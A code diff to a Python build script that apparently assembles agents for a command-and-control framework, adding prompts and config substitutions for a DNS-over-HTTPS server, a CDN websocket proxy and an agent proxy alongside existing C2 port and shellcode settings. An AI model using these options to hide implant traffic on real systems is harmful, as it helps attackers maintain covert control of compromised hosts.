@@ -201,6 +201,18 @@ class GoBuild:
         unsed("./lib/data/def.go",
               "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")
 
+        # DoH
+        unsed("./lib/data/def.go",
+              "DoHServer = \"\"", f"DoHServer = \"{CACHED_CONF['doh_server']}\"")
+
+        # CDN
+        unsed("./lib/data/def.go",
+              "CDNProxy = \"\"", f"CDNProxy = \"{CACHED_CONF['cdn_proxy']}\"")
+
+        # Agent Proxy
+        unsed("./lib/data/def.go",
+              "AgentProxy = \"\"", f"AgentProxy = \"{CACHED_CONF['agent_proxy']}\"")
+
         # ports
         unsed("./lib/data/def.go",
               "CCPort = \"[cc_port]\"", f"CCPort = \"{CACHED_CONF['cc_port']}\"")
@@ -269,6 +281,18 @@ class GoBuild:
         # agent UUID
         sed("./lib/data/def.go",
             "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")
+
+        # DoH
+        sed("./lib/data/def.go",
+            "DoHServer = \"\"", f"DoHServer = \"{CACHED_CONF['doh_server']}\"")
+
+        # CDN
+        sed("./lib/data/def.go",
+            "CDNProxy = \"\"", f"CDNProxy = \"{CACHED_CONF['cdn_proxy']}\"")
+
+        # Agent Proxy
+        sed("./lib/data/def.go",
+            "AgentProxy = \"\"", f"AgentProxy = \"{CACHED_CONF['agent_proxy']}\"")
 
         # ports
         sed("./lib/data/def.go",
@@ -428,6 +452,39 @@ def main(target):
     if not use_cached:
         indicator_text = input("CC status indicator text: ").strip()
         CACHED_CONF['indicator_text'] = indicator_text
+
+    # Agent proxy
+    use_cached = False
+
+    if "agent_proxy" in CACHED_CONF:
+        use_cached = yes_no(
+            f"Use cached agent proxy ({CACHED_CONF['agent_proxy']})?")
+
+    if not use_cached:
+        agentproxy = input("Proxy server for agent: ").strip()
+        CACHED_CONF['agent_proxy'] = agentproxy
+
+    # CDN
+    use_cached = False
+
+    if "cdn_proxy" in CACHED_CONF:
+        use_cached = yes_no(
+            f"Use cached CDN server ({CACHED_CONF['cdn_proxy']})?")
+
+    if not use_cached:
+        cdn = input("CDN websocket server: ").strip()
+        CACHED_CONF['cdn_proxy'] = cdn
+
+    # DoH
+    use_cached = False
+
+    if "doh_server" in CACHED_CONF:
+        use_cached = yes_no(
+            f"Use cached DoH server ({CACHED_CONF['doh_server']})?")
+
+    if not use_cached:
+        doh = input("DNS over HTTP server: ").strip()
+        CACHED_CONF['doh_server'] = doh
 
     # guardian shellcode
 
